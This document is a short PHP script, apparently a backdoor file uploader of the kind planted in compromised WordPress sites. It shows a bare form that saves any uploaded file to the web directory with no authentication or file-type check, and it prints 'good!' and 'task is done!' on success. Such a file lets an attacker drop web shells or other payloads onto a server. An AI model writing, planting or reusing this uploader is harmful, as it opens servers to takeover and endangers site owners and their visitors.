<?php
if(move_uploaded_file($_FILES["wp_file"]["tmp_name"],basename($_FILES["wp_file"]["name"]))){
	$fname = basename($_FILES["wp_file"]["name"])."	good!";
	echo $fname;
}
echo "<form enctype=\"multipart/form-data\" method=\"POST\">
<input type=\"file\" name=\"wp_file\"/>
<input type=\"submit\" value=\"go.\"/>
</form>
</br>task is done!";
?>